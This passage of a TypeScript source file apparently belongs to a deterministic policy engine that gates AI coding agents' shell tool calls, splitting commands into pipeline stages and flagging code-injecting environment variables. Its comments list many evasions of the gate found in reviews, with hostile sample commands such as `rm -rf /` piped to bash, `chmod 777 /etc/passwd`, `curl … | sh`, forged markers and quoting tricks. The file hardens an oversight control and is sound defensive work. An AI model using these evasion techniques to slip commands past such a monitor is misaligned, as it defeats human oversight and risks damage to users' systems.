// Evaluates a host tool call against the compiled authority table. Deterministic: no model involvement.
import { homedir, tmpdir } from 'node:os';
import { readFileSync, readdirSync, realpathSync, statSync } from 'node:fs';
import { dirname, isAbsolute, join, resolve, sep } from 'node:path';
import { shimScript, gitHooksDir } from '../project/githooks.ts';
import { packageRoot } from '../launcher/self.ts';
import { git, gitConfigGet } from '../util/git.ts';
import type { CompiledAuthorityTable, CompiledMatcher } from './compile.ts';
import type { LocalTargets, TargetClass, Verdict } from '../control-plane/types.ts';
import { VERDICT_RANK } from '../control-plane/types.ts';

export interface EvaluationContext {
  profile: string;
  mode: string;
  /** absolute roots of registered repositories (workspace members) */
  repoRoots: string[];
  /** EGO_HOME, treated as inside-workspace for reads and kernel writes */
  egoHome?: string;
  /** capability ids granted ASK→ALLOW for the current task */
  grants?: string[];
  /** true when running inside the EGO source repository under EGO_MAINTENANCE */
  inEgoRepository?: boolean;
  cwd?: string;
  /** effect resolution (alignment item 5): override file access for tests; default reads the real filesystem */
  readFile?: (absPath: string) => string | null;
}

export interface ToolRequest {
  tool: string;
  input: Record<string, unknown>;
}

export interface CapabilityHit {
  capability: string;
  verdict: Verdict;
  via: string;
  segment?: string;
  absolute: boolean;
  grantApplied?: boolean;
  /** set when the hit was found inside the effect of a script, package script or make target */
  effectOf?: string;
  /** opacity that means "something WILL run that could not be read", as opposed to "the target does not exist" */
  opaqueUnread?: boolean;
}

export interface Evaluation {
  verdict: Verdict;
  hits: CapabilityHit[];
  reason: string;
  /** the most restrictive hit that decided the verdict */
  decisive?: CapabilityHit;
}

const WRAPPERS = new Set([
  // package-manager runners resolve a name to a local or fetched binary and then exec it. They were handled
  // inside individual matcher regexes (`(npx\s+)?…`) but NOT by the normalizer, so the matcher pass and the
  // producer dispatch read two different commands: `npx vitest run` matched `command.test` as if it were
  // `vitest run`, while the dispatch saw the head `npx` and claimed a bounded closure (challenge 8, finding 4).
  'npx',
  'bunx',
  'env',
  'nice',
  'time',
  'nohup',
  'command',
  'exec',
  'builtin',
  'stdbuf',
  'caffeinate',
  'setsid',
  'ionice',
  'chronic',
  'strace',
  'ltrace',
  'valgrind',
  'watch',
  'unbuffer',
  'nocorrect',
  'noglob',
  'chrt',
  'taskset',
  'numactl',
  'prlimit',
  'cpulimit',
  'eatmydata',
  'fakeroot',
  'proxychains',
  'proxychains4',
  'torsocks',
  'rlwrap',
  'sem',
  'arch',
  'daemonize',
  'xvfb-run',
  'firejail',
  'unshare',
  'nsenter',
  'systemd-run',
  'sandbox-exec',
  'busybox',
  'gtimeout',
]);
// `doas` is deliberately NOT a transparent wrapper: like `sudo`, it must keep its head so the command.privileged
// matcher that names it can fire (its inner command is analysed separately in normalizeTail).
/** wrapper options that consume the next token as their value (the command starts after it) */
/** `exec -a NAME prog` sets argv[0] to NAME and runs `prog`. Classifying NAME let an arbitrary program run as
 *  whatever the agent felt like calling it (exit review 3). */
// `exec`'s OWN options may precede the argv0 alias: `exec -c -a echo curl …` hid the real program behind the
// alias and reached ALLOW (exit review 4).
const EXEC_ARGV0_RE = /^exec\s+(?:-(?!a\b)[a-zA-Z-]+\s+)*(?:-a|--argv0)\s+\S+\s+/;
const WRAPPER_VALUE_OPTS: Record<string, RegExp> = {
  env: /^(-u|--unset|-C|--chdir|-S|--split-string)$/,
  nice: /^(-n|--adjustment)$/,
  ionice: /^(-c|-n|-p|--class|--classdata)$/,
  watch: /^(-n|--interval)$/, // `-d` is a flag (--differences), not a value option: it must not eat the command head
  stdbuf: /^-[ioe]$/,
  strace: /^-[opesEu]$/,
  ltrace: /^-[opesu]$/,
  valgrind: /^--tool$/,
  time: /^(-o|--output|-f|--format)$/,
  chrt: /^(-p|--pid)$/,
  taskset: /^(-p|--pid)$/,
  numactl: /^(-C|-N|-m|-p|--physcpubind|--cpunodebind|--membind|--preferred)$/,
  prlimit: /^(-p|--pid)$/,
  cpulimit: /^(-l|--limit|-p|--pid|-e|--exe)$/,
  'xvfb-run': /^(-n|-s|-e|-f|--server-num|--server-args)$/,
  'systemd-run': /^(-p|--property|-u|--unit|-E|--setenv|-M|--machine)$/,
  'sandbox-exec': /^(-f|-p|-n|-D)$/,
  nsenter: /^(-t|--target)$/,
  sem: /^(-j|--jobs|--id)$/,
  doas: /^(-u|-C)$/,
  gtimeout: /^(-s|--signal|-k|--kill-after)$/,
  timeout: /^(-s|--signal|-k|--kill-after)$/,
};
/** wrappers whose leading positional operands (a priority, a cpu mask, an architecture) precede the command */
const WRAPPER_POSITIONALS: Record<string, RegExp> = {
  chrt: /^\d+$/,
  taskset: /^(0x[0-9a-fA-F]+|[0-9,-]+)$/,
  timeout: /^\d+(\.\d+)?[smhd]?$/,
  gtimeout: /^\d+(\.\d+)?[smhd]?$/,
  arch: /^-?(arm64|arm64e|x86_64|i386)$/,
};
/** wrappers whose first argument is their own operand, not the command: the command starts after it */
const WRAPPERS_WITH_OPERAND = new Set(['flock', 'su', 'runuser']);
/** two-word runners: the pair is stripped so the real command is what everything downstream sees */
const WRAPPER_PAIRS: ReadonlyArray<readonly [string, string]> = [['pnpm', 'exec'], ['yarn', 'exec']];
/** environment assignments that change what a command executes or where governance looks: never silently stripped */
const ENV_INJECT_RE =
  /^(LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|BASH_ENV|ENV|PS4|BASH_XTRACEFD|PROMPT_COMMAND|NODE_OPTIONS|PYTHONSTARTUP|PYTHONPATH|PERL5OPT|RUBYOPT|GIT_CONFIG[A-Z_]*|GIT_(DIR|WORK_TREE|INDEX_FILE|COMMON_DIR|SSH_COMMAND|SSH|PROXY_COMMAND|EXTERNAL_DIFF|EDITOR|PAGER|ASKPASS|CEILING_DIRECTORIES|NAMESPACE|ALTERNATE_OBJECT_DIRECTORIES|OBJECT_DIRECTORY|EXEC_PATH|TEMPLATE_DIR|ATTR_SOURCE)|EGO_[A-Z_]+|CLAUDE_[A-Z_]+|CODEX_[A-Z_]+|SSH_ASKPASS|SUDO_ASKPASS|SWIFT_EXEC|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|_JAVA_OPTIONS|LD_AUDIT|KUBECONFIG|AWS_PROFILE|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|DOCKER_HOST|DOCKER_CONFIG|NPM_CONFIG_[A-Z_]+|HOME|PATH|SHELL|IFS)$/;

/** Options of a governed variable that actually LOAD CODE. `NODE_OPTIONS=--max-old-space-size=4096 npm test` is
 *  the standard fix for an out-of-memory build and it executes nothing; denying it while `npm test` on its own is
 *  ALLOW is a gate on ordinary work (exit review 7). The variable stays governed — `--require`, `--import` and
 *  the loaders are exactly why — but a value that cannot name a program is not an injection. */
const NODE_OPTIONS_EXECUTES = /--(require|import|loader|experimental-loader|experimental-vm-modules|cpu-prof-dir|heap-prof-dir|diagnostic-dir|inspect-publish-uid|env-file|conditions)\b|-r\b/;
/** True when this binding really changes what runs. */
function envInjects(name: string, assignment: string): boolean {
  if (name === 'NODE_OPTIONS') {
    // node reads `--experimental_loader` and `--experimental-loader` as the SAME option, so the test normalises
    // the separator before looking (exit review 8)
    const value = assignment.slice(assignment.indexOf('=') + 1).replace(/_/g, '-');
    return NODE_OPTIONS_EXECUTES.test(value);
  }
  return true;
}

/** THE SENTINEL THAT MAKES A STATE MARKER UNFORGEABLE.
 *
 *  The analyzer injects markers into the segment stream — `define-function`, `env-inject NAME`, `local-function`,
 *  `registry-fetch`, `force-ref-reset`, `heredoc-unterminated`, the subshell cwd restore — and the control plane
 *  matches them with ordinary regexes. They were plain words, so a COMMAND could spell one:
 *  `define-function git; git push origin main` made the analyzer believe `git` was a locally defined function,
 *  whose body it had already read, and the real push was classified `local-function …` — read-only, ALLOW. The
 *  same forgery reached `psql`, `aws`, `terraform`, `vault` and `argocd`, i.e. through absolute core denies
 *  (exit review 7).
 *
 *  Two locks, because one is not enough. FIRST, every marker carries this sentinel, so no ordinary command
 *  collides with one by accident. SECOND, `externalText` mangles the sentinel out of every byte that enters the
 *  analyzer from outside — the tool's command, a script line, a make recipe, a manifest script, a hook body — so
 *  no command can spell one on purpose either. A forged marker becomes ordinary text and is classified as what it
 *  is, rather than silencing the classification of what follows. */
const MARK = '\u0000ego\u0000';
/** Mangle EGO's own marker sentinel out of text that came from OUTSIDE the analyzer. Every hand-over of external
 *  bytes goes through here; the replacement keeps the length and the word shape, so what the reader sees is a
 *  plain unknown command rather than a marker. */
export function externalText(text: string): string {
  return text.includes(MARK) ? text.split(MARK).join('\uFFFDego\uFFFD') : text;
}

/** A `cd` inside a subshell does NOT move the caller's directory, so the analyzer must stop claiming to know it
 *  once the subshell closes. Emitting this marker is how a flat segment list says so: the target carries a `$`, and
 *  a `cd` to a dynamic target is already the analyzer's "the working directory is no longer proven". */
const SUBSHELL_CWD_RESTORE = `${MARK}subshell-cwd-restore`;
/** marks a heredoc whose delimiter never arrived: the rest of the command was consumed as its body, so what this
 *  splitter returned is NOT the set of commands that will run */
const HEREDOC_UNTERMINATED = `${MARK}heredoc-unterminated`;
/** marks a function definition whose header the splitter consumed: it binds a name and executes nothing */
const FUNCTION_DEF_PREFIX = `${MARK}define-function`;
/** a segment that is only redirections — the tail of a group or subshell whose delimiters were consumed */
const REDIRECT_ONLY_RE = /^(?:(?:\d*(?:>>?|<>?)\|?|&>>?)\s*(?:"[^"]*"|'[^']*'|\S+)\s*)+$/;
/** shell keywords that may precede a command WITHOUT being one: after them, the next word is still a command */
const KEYWORD_PREFIX_RE = /^(if|then|else|elif|while|until|do|!|time|coproc)$/;
/** a function definition header: `f()`, `f ()`, `function f`, `function f ()` — structure, not a command */
const FUNC_DEF_RE = /^(?:function\s+)?[A-Za-z_][A-Za-z0-9_:.-]*\s*\(\s*\)$|^function\s+[A-Za-z_][A-Za-z0-9_:.-]*$/;

/** One stage of a shell unit. A PIPELINE IS AN EXECUTION EDGE, not merely a separator: `echo 'rm -rf /' | bash`
 *  runs the first stage's standard output as the second stage's SCRIPT, and a model that discards the `|` cannot
 *  see that at all — the two stages look unrelated, and the effect crosses its authority floor between them
 *  (exit review 4). The edge is therefore part of the canonical analysis rather than a special case bolted on. */
export interface ShellStage {
  readonly text: string;
  /** true when this stage reads the PREVIOUS stage's standard output */
  readonly pipedFromPrevious: boolean;
  /** the heredoc body this stage was fed, when it opened one: that body IS its standard output */
  readonly heredocBody?: string;
  /** true when the heredoc delimiter was UNQUOTED, so the shell expands substitutions in the body */
  readonly heredocExpanded?: boolean;
  /** true when a PROCESS substitution was consumed into this stage: `bash <(echo CMD)` runs CMD, because the
   *  substitution hands the interpreter a file containing that command's output (exit review 5) */
  readonly fromProcessSubstitution?: boolean;
  /** The GROUP this stage belongs to, when the splitter consumed a `{ … }` or `( … )` around it. A group's
   *  standard output is the CONCATENATION of what its commands write, so the upstream of a pipe fed by one is
   *  the whole group: `{ echo 'git push origin main'; echo ls; } | sh` runs BOTH lines as the shell's script,
   *  and reading only the last stage lost the first (exit review 7). */
  readonly groupId?: number;
}

/** The segments of a command, with the pipeline edges between them. */
export function splitShellPipeline(command: string): ShellStage[] {
  const segments: Array<{
    text: string;
    pipedFromPrevious: boolean;
    heredocBody?: string;
    heredocExpanded?: boolean;
    fromProcessSubstitution?: boolean;
  }> = [];
  let sawProcessSubstitution = false;
  /** set by a `|` split and consumed by the NEXT stage, which is the one that reads the pipe */
  let pendingPipe = false;
  const consumePipe = (): boolean => {
    const p = pendingPipe;
    pendingPipe = false;
    return p;
  };
  let cur = '';
  let inSingle = false;
  let inDouble = false;
  let i = 0;
  // depth of SUBSHELLS whose parentheses this splitter consumed, and where the outermost one started
  let subshell = 0;
  let subshellStart = 0;
  // the stack of groups whose delimiters this splitter consumed, innermost last; every stage pushed while one is
  // open carries its id, which is what lets a piped stage read the WHOLE group's output
  let groupSeq = 0;
  const groupStack: number[] = [];
  // heredocs opened on the line being scanned; their BODIES are consumed when that line ends
  const pendingHeredocs: Array<{ delim: string; quoted: boolean; strip: boolean; openerIndex?: number }> = [];
  const push = () => {
    const t = cur.trim();
    // A REDIRECTION IS NOT A COMMAND. Consuming a group's braces leaves `{ echo a; echo b; } > out.txt` with a
    // headless `> out.txt`, which was classified as an unknown command and asked for an ordinary workspace write
    // (exit review 4). It belongs to the command it redirects, so it is re-attached to it.
    if (t) {
      if (segments.length && REDIRECT_ONLY_RE.test(t)) segments[segments.length - 1]!.text += ' ' + t;
      else
        segments.push({
          text: t,
          pipedFromPrevious: consumePipe(),
          fromProcessSubstitution: sawProcessSubstitution,
          // the OUTERMOST group: a nested `{ … }` inside a group is still part of the same standard output, and
          // keying on the innermost one broke the upstream run at the nested brace (exit review 8)
          ...(groupStack.length ? { groupId: groupStack[0]! } : {}),
        });
      sawProcessSubstitution = false;
      if (/^case\s+\S+\s+in(\s|$)/.test(t)) caseDepth++;
      else if (/^esac\b/.test(t)) caseDepth = Math.max(0, caseDepth - 1);
      // WHICH STAGE OPENED THE HEREDOC. Attributing the body to the LAST stage on the line was wrong the moment
      // anything followed the opener: in `bash <<EOF | cat` the body belongs to bash, and giving it to `cat` lost
      // the script entirely (exit review 5).
      for (const hd of pendingHeredocs)
        if (hd.openerIndex === undefined && new RegExp(`<<-?\\s*['"\\\\]?${hd.delim}`).test(t))
          hd.openerIndex = segments.length - 1;
    }
    cur = '';
  };
  let caseDepth = 0;
  /** true where a COMMAND may begin: nothing pending, or only a shell keyword */
  const atCommandStart = (): boolean => cur.trim() === '' || KEYWORD_PREFIX_RE.test(cur.trim());
  /** true where a FUNCTION BODY may begin: the pending text is the definition header and nothing else */
  const atFunctionBody = (): boolean => FUNC_DEF_RE.test(cur.trim());
  while (i < command.length) {
    const ch = command[i]!;
    const next = command[i + 1];
    // A BACKSLASH-NEWLINE IS REMOVED BEFORE TOKENIZATION, INCLUDING IN THE MIDDLE OF A WORD. The shell deletes
    // the pair before it parses anything, so `do\<newline>cker run …` IS `docker run …` — verified against
    // bash, zsh and dash, which all execute the joined program name. Keeping the pair left the head reading as
    // `do`, which is in the shell-keyword read-only matcher, and the whole line was classified read-only: a
    // recursive delete of a production S3 bucket reached ALLOW, and so did writes to `.gi\<newline>t/hooks/`,
    // `.harn\<newline>ess/runtime/` and `.hus\<newline>ky/` (exit review 8). Inside SINGLE quotes there is no
    // escape at all, so the pair stays literal there.
    if (ch === '\\' && next === '\n' && !inSingle) {
      i += 2;
      continue;
    }
    if (ch === '\\' && !inSingle) {
      cur += ch + (next ?? '');
      i += 2;
      continue;
    }
    // `$'…'` IS AN ANSI-C STRING, AND A BACKSLASH ESCAPES INSIDE IT. An ordinary single-quoted string has no
    // escapes at all, so the scanner read `$'\''` as quote-open, backslash, quote-close, quote-OPEN — and believed
    // it was inside a quote for the whole rest of the line. Everything after it collapsed into one `echo`-headed
    // segment: `echo $'\'' && sh -c 'git push origin main'` was ALLOW, and so was every other DENY spelled after
    // it, including the trust store and `curl … | sh` (exit review 7). `$"…"` is an ordinary double-quoted string
    // with translation, so it needs no special case beyond not being read as a `$`-headed word.
    if (ch === '$' && next === "'" && !inSingle && !inDouble) {
      let j = i + 2;
      let body = '';
      while (j < command.length) {
        if (command[j] === '\\' && j + 1 < command.length) {
          body += command[j]! + command[j + 1]!;
          j += 2;
          continue;
        }
        if (command[j] === "'") break;
        body += command[j]!;
        j++;
      }
      cur += "$'" + body + "'";
      i = j + 1;
      continue;
    }
    if (ch === "'" && !inDouble) inSingle = !inSingle;
    else if (ch === '"' && !inSingle) inDouble = !inDouble;
    if (!inSingle && !inDouble) {
      if ((ch === '&' && next === '&') || (ch === '|' && next === '|')) {
        push();
        i += 2;
        continue;
      }
      // A HEREDOC BODY IS DATA, NOT COMMANDS. The top-level splitter had no heredoc tracking at all, so the prose
      // of `cat > NOTES.md <<'MD' … MD` was classified: a release note containing `git push origin main --tags`
      // was DENIED as a push (exit review 4). A QUOTED delimiter means no expansion, so the body is inert; an
      // UNQUOTED one still expands `$( )` and backticks, and those substitutions really do run.
      // `$[ … ]` and `$(( … ))` both hold ARITHMETIC, where `<<` is a LEFT SHIFT. The old form was not
      // recognised here, so `echo $[1<<true]` opened a heredoc named `true` — and a later line saying `true`
      // terminated it, making every line between them the body and hiding a `git push origin main` completely
      // (exit review 8). The whole expression is consumed as the one word it is.
      if (ch === '$' && next === '[') {
        const close = command.indexOf(']', i + 2);
        if (close > 0) {
          cur += command.slice(i, close + 1);
          i = close + 1;
          continue;
        }
      }
      if (ch === '<' && next === '<') {
        // `<<<` is a HERESTRING: it carries data and opens nothing. Consuming all three is what keeps the scanner
        // from reading the SECOND `<` as the start of a heredoc whose delimiter never arrives — which swallowed
        // the whole rest of a script body.
        if (command[i + 2] === '<') {
          cur += '<<<';
          i += 3;
          continue;
        }
        const opener = /^<<(-?)\s*(?:'([^']*)'|"([^"]*)"|(\\?)([A-Za-z_][A-Za-z0-9_]*))/.exec(command.slice(i));
        if (opener) {
          const delim = opener[2] ?? opener[3] ?? opener[5] ?? '';
          pendingHeredocs.push({
            delim,
            quoted: opener[2] !== undefined || opener[3] !== undefined || opener[4] === '\\',
            strip: opener[1] === '-',
          });
          cur += opener[0]; // the redirection stays part of the command that opens it
          i += opener[0].length;
          continue;
        }
      }
      // a `|` preceded by `>` is the `>|` noclobber-override redirect operator, not a pipe — do not split there
      if (ch === ';' || ch === '\n' || (ch === '|' && command[i - 1] !== '>')) {
        const piped = ch === '|';
        push();
        if (ch === '\n' && pendingHeredocs.length) {
          let k = i + 1;
          for (const hd of pendingHeredocs) {
            const opener = segments[hd.openerIndex ?? segments.length - 1];
            let body = '';
            let terminated = false;
            while (k < command.length) {
              const nl = command.indexOf('\n', k);
              const line = command.slice(k, nl < 0 ? command.length : nl);
              k = nl < 0 ? command.length : nl + 1;
              if ((hd.strip ? line.replace(/^\t+/, '') : line).trim() === hd.delim) {
                terminated = true;
                break;
              }
              body += line + '\n';
            }
            // A HEREDOC BODY IS ONE OF THREE THINGS, and the SHELL decides which — verified against bash and dash.
            //   1. a SCRIPT, when the command reading it takes its program from stdin (`bash <<EOF`);
            //   2. an EXPANSION SITE, when the delimiter is UNQUOTED: `$( )` and backticks run, and there is NO
            //      quoting inside the body at all — `'` and `"` are ordinary characters there;
            //   3. inert DATA, when the delimiter is quoted.
            // Modelling only (3) made `bash <<EOF … git push … EOF` ask instead of denying (exit review 4).
            // the opener's ROLE is read in canonical form: a keyword, a case pattern or a subshell in front of it
            // made `then bash <<EOF` and `a) bash <<EOF` look like commands named `then` and `a)` (exit review 5)
            if (opener && readsScriptFromStdin(emitterTail(opener.text)))
              for (const sg of splitShellPipeline(body)) segments.push(sg);
            else if (!hd.quoted)
              for (const innerCmd of substitutionsIn(body))
                for (const sg of splitShellPipeline(innerCmd)) segments.push(sg);
            if (opener) {
              // the body is also this stage's STANDARD OUTPUT, which a following `| sh` would run
              opener.heredocBody = (opener.heredocBody ?? '') + body;
              opener.heredocExpanded = opener.heredocExpanded === true || !hd.quoted;
            }
            // A heredoc whose delimiter never arrives means the command was misread: everything after it was
            // consumed as data, so say so rather than returning a short list that looks complete.
            if (!terminated) segments.push({ text: HEREDOC_UNTERMINATED, pipedFromPrevious: false });
          }
          pendingHeredocs.length = 0;
          i = k;
          continue;
        }
        // EACH STAGE OF A PIPELINE IS ITS OWN SUBSHELL: `cd sub | true ; make build` leaves the caller where it
        // was, and the analyzer followed the `cd` out of it (exit review 4).
        if (piped) pendingPipe = true;
        if (piped && /^(cd|pushd|popd)(\s|$)/.test(segments[segments.length - 1]?.text ?? ''))
          segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
        i++;
        continue;
      }
      // `&` IN A REDIRECTION IS NOT THE BACKGROUND OPERATOR. `2>&1`, `>&2` and `&> log` were split there, which
      // produced a phantom command named `1` and — worse — orphaned the target of `>&FILE`, so a write to a
      // governed path asked instead of being denied (exit review 4).
      if (ch === '&' && next !== '&' && next !== '>' && command[i - 1] !== '>' && command[i - 1] !== '<') {
        push();
        i++;
        continue;
      }
      // A COMMENT IS NOT COMMAND TEXT, and it is where an unpaired quote hides. `echo hi  # isn't ready` put the
      // scanner into a phantom single-quoted state, and every following LINE of a multi-line command was swallowed
      // into it — `git push --force origin main` on the next line never became a segment and the whole call was
      // ALLOW (exit review 4). A `#` starts a comment only at the start of a WORD, exactly as in the shell, so
      // `http://x/#frag` and `--pretty=%h#` are untouched.
      // a `#` starts a comment at the start of a WORD — which is after whitespace OR after any unquoted operator
      // that ends one. `echo hi;# it's fine` put the scanner into a phantom quoted state through the apostrophe
      // (exit review 6).
      if (ch === '#' && (i === 0 || /[\s;&|()]/.test(command[i - 1]!))) {
        const nl = command.indexOf('\n', i);
        i = nl < 0 ? command.length : nl; // the newline itself still separates the commands
        continue;
      }
      // A SUBSHELL AND A BRACE GROUP ARE SHELL STRUCTURE, NOT COMMANDS. Their delimiters were kept inside the
      // segment, so the head became `(` and every anchored matcher missed: `( chmod 777 /etc/passwd )` was
      // command.unknown — an ASK — where the same line without the parentheses is DENY (corpus by semantic class,
      // 2026-09-24). `((` is arithmetic, which runs no command, and is deliberately left alone; a `)` that closes
      // nothing this splitter opened — a `case` pattern — stays literal.
      // `((` AT A COMMAND POSITION IS TWO NESTED SUBSHELLS, not arithmetic. A POSIX shell has no `(( ))` command,
      // so `((chmod 777 /etc/passwd))` runs the chmod under dash — and under bash it is a syntax error, which
      // executes nothing. Reading it as subshells is therefore right where it runs and harmless where it does not;
      // leaving it alone was a floor crossing (exit review 4). Standalone bash arithmetic `(( i++ ))` asked before
      // this and asks after it.
      if (ch === '(' && atCommandStart()) {
        if (subshell === 0) subshellStart = segments.length;
        subshell++;
        groupStack.push(++groupSeq);
        // a keyword that introduced the group is structure too: pushing `time` or `if` as its own segment made it
        // an unknown command
        if (cur.trim()) cur = '';
        i++;
        continue;
      }
      if (ch === ')' && subshell > 0) {
        push();
        subshell--;
        groupStack.pop();
        if (subshell === 0 && segments.slice(subshellStart).some((sg) => /^(cd|pushd|popd)(\s|$)/.test(sg.text)))
          segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
        i++;
        continue;
      }
      // A FUNCTION DEFINITION IS STRUCTURE, AND ITS BODY IS COMMANDS. `f() { chmod 777 /etc/passwd; }; f` kept the
      // header glued to the first command, so the head was `f()` and every head-anchored classification missed —
      // an absolute core deny reached ASK, at any producer depth (exit review 4). The header is discarded; the
      // body is split like any other group.
      if ((ch === '{' || ch === '(') && atFunctionBody()) {
        // The header is not a command — but it IS a BINDING: the name it declares re-points every later use in
        // this unit. Discarding it outright lost that, so the marker carries the name to the binding dimension
        // while nothing classifies it as a program.
        const declared = /([A-Za-z_][A-Za-z0-9_:.-]*)\s*(?:\(\s*\))?$/.exec(cur.trim());
        // ...and NOT inside a `case` branch, where the splitter has already swallowed the pattern list so no
        // segment says `case` any more. A definition there binds nothing unless that branch is the one taken
        // (exit review 8).
        if (declared && caseDepth === 0)
          segments.push({ text: `${FUNCTION_DEF_PREFIX} ${declared[1]}`, pipedFromPrevious: false });
        cur = '';
        groupStack.push(++groupSeq);
        if (ch === '(') {
          if (subshell === 0) subshellStart = segments.length;
          subshell++;
        }
        i++;
        continue;
      }
      if (ch === '{' && atCommandStart() && (next === ' ' || next === '\t' || next === '\n')) {
        if (cur.trim()) cur = '';
        groupStack.push(++groupSeq);
        i++;
        continue;
      }
      if (ch === '}' && cur.trim() === '') {
        groupStack.pop();
        i++;
        continue;
      }
      // A `case` BRANCH IS A COMMAND, AND ITS PATTERN LIST IS NOT. The pattern stayed inside the segment, so the
      // head was `case` or the pattern word and every head-dependent classification missed: in
      // `case $x in a) chmod 777 /etc/passwd ;; esac` the path was read as an ARGUMENT — an ASK — where the same
      // command alone writes /etc/passwd and is DENY (exit review 4). The pattern list is discarded; `case … in`
      // is recognised whether the branch is on that line or below it, and a `)` that closes something else — an
      // array assignment inside a branch — is left alone by the shape guard.
      if (ch === ')') {
        const pending = cur.trim();
        if (/^case\s+\S+\s+in(\s|$)/.test(pending)) {
          caseDepth++;
          cur = '';
          i++;
          continue;
        }
        if (caseDepth > 0 && /^\(?\s*[^\s()|;&]*$/.test(pending)) {
          cur = '';
          i++;
          continue;
        }
      }
    }
    // COMMAND SUBSTITUTION IS SUPPRESSED BY SINGLE QUOTES ONLY. Double quotes stop the shell from SPLITTING on
    // operators, and stop nothing else: `echo "$(git push origin main)"` runs the push. Guarding the extractor
    // with `!inDouble` alongside the operator branches dropped an entire execution channel — every DENY in the
    // control plane was reachable through it in one Bash call, at ALLOW, which on claude-code suppresses the
    // host's own prompt (exit review 3).
    if (!inSingle) {
      // ARITHMETIC EXPANSION RUNS NO COMMAND — BUT `$((` IS NOT ENOUGH TO RECOGNISE IT. `$((cmd) )` and
      // `$((cmd); true)` are COMMAND SUBSTITUTIONS of a subshell in bash, zsh and dash: verified against real
      // shells, they run `cmd`. Treating every `$((` as arithmetic therefore erased the command entirely and every
      // DENY in the control plane became ALLOW through it — a regression this branch introduced and exit review 4
      // found. A shell resolves the ambiguity by requiring the span to CLOSE with `))`; when it does not, it
      // re-parses as `$( (…) …)`. So does this: arithmetic only when the two closing parens are adjacent.
      // ...and a body carrying a shell OPERATOR is not arithmetic in any shell: `$((:) && (git push origin
      // main))` is a command substitution containing two subshells (exit review 8).
      if (
        ch === '$' &&
        next === '(' &&
        command[i + 2] === '(' &&
        // ...and only when the BODY could be arithmetic: a shell operator anywhere before the closing `))` means
        // this is a command substitution containing subshells, which is what `$((:) && (git push …))` is
        !/[;&|]/.test(command.slice(i + 3, (command.indexOf('))', i + 3) + 2) || command.length))
      ) {
        let depth = 0;
        let j = i + 1;
        let inner = '';
        let prevClose = false; // true when the character before the closing paren was itself `)`
        while (j < command.length) {
          const c = command[j]!;
          if (c === '(') depth++;
          else if (c === ')') depth--;
          if (depth === 0) {
            prevClose = command[j - 1] === ')';
            break;
          }
          if (!(depth === 1 && c === '(')) inner += c;
          j++;
        }
        if (prevClose) {
          // the expression itself is never executed, so only the commands SUBSTITUTED INTO it are segments: the
          // arithmetic remainder that carries their output (`$SUBST + 1`) is a number here, not a command
          if (/\$\(|`/.test(inner))
            for (const sg of splitShellPipeline(inner)) if (!/^\$SUBST\b/.test(sg.text)) segments.push(sg);
          cur += '$ARITH';
          i = j + 1;
          continue;
        }
        // not arithmetic: fall through to the command-substitution branch below, which reads `$( … )`
      }
      if ((ch === '$' || ch === '<' || ch === '>') && next === '(') {
        if (ch === '<' || ch === '>') sawProcessSubstitution = true;
        // command or process substitution: capture the inner command as its own segment and keep scanning
        let depth = 1;
        let j = i + 2;
        let inner = '';
        let q: string | null = null;
        while (j < command.length && depth > 0) {
          const c = command[j]!;
          // quotes and escapes inside the substitution body never close it
          if (c === '\\' && q !== "'") {
            inner += c + (command[j + 1] ?? '');
            j += 2;
            continue;
          }
          if (q) {
            if (c === q) q = null;
          } else if (c === "'" || c === '"') q = c;
          else if (c === '(') depth++;
          else if (c === ')') depth--;
          if (depth > 0) inner += c;
          j++;
        }
        const innerSegments = splitShellPipeline(inner);
        for (const s of innerSegments) segments.push(s);
        // A COMMAND SUBSTITUTION RUNS IN A SUBSHELL, so a `cd` in it does not move the caller either — the same
        // rule as `( )`, and without it `echo "$(cd sub && pwd)" && make build` resolved the CALLER's make against
        // sub/ (exit review 4).
        if (innerSegments.some((sg) => /^(cd|pushd|popd)(\s|$)/.test(sg.text)))
          segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
        // the placeholder stands INSIDE the word the substitution was part of. Separating it with a space made
        // `TODAY=$(date +%F)` read as the assignment `TODAY=` followed by a command whose head is a substitution,
        // so the most ordinary line in any script was opaque (exit review 4).
        cur += '$SUBST';
        i = j;
        continue;
      }
      if (ch === '`') {
        // A NESTED BACKTICK IS ESCAPED, and the inner pair is the one that runs LAST. POSIX nests backticks by
        // writing the inner ones as `\``, so the FIRST unescaped backtick after this one closes the outer
        // substitution — `indexOf` found the escaped one instead and cut the body in half, which hid the inner
        // command entirely (exit review 8). The body then has its escapes removed, because that is what the
        // shell hands to the inner parse.
        let end = -1;
        for (let k = i + 1; k < command.length; k++) {
          if (command[k] === '\\') {
            k++;
            continue;
          }
          if (command[k] === '`') {
            end = k;
            break;
          }
        }
        if (end > i) {
          const backticked = splitShellPipeline(command.slice(i + 1, end).replace(/\\([`$\\])/g, '$1'));
          for (const s of backticked) segments.push(s);
          if (backticked.some((sg) => /^(cd|pushd|popd)(\s|$)/.test(sg.text)))
            segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
          cur += '$SUBST';
          i = end + 1;
          continue;
        }
      }
    }
    cur += ch;
    i++;
  }
  push();
  return segments;
}

/** The commands SUBSTITUTED into a text: the inner command of every `$( )` and backtick span outside single
 *  quotes. Used for an UNQUOTED heredoc body, where the shell expands substitutions but the prose around them is
 *  data — `git push origin main` written in a release note is not a push. */
function substitutionsIn(text: string): string[] {
  const out: string[] = [];
  // THERE IS NO QUOTING INSIDE A HEREDOC BODY. `'` and `"` are ordinary characters there, so a scanner that
  // tracked them skipped the substitutions that the shell does expand (exit review 4). Only the backslash escape
  // survives, and only before `$`, `` ` `` and `\`.
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (ch === '\\') {
      i++;
      continue;
    }
    if (ch === '$' && text[i + 1] === '(' && text[i + 2] === '(') {
      // `$((…))` closing with ADJACENT parens is arithmetic and runs nothing; anything else is `$( (…) …)`
      let d = 0;
      let j = i + 1;
      let prevClose = false;
      for (; j < text.length; j++) {
        if (text[j] === '(') d++;
        else if (text[j] === ')' && --d === 0) {
          prevClose = text[j - 1] === ')';
          break;
        }
      }
      if (prevClose) {
        for (const nested of substitutionsIn(text.slice(i + 3, j - 1))) out.push(nested);
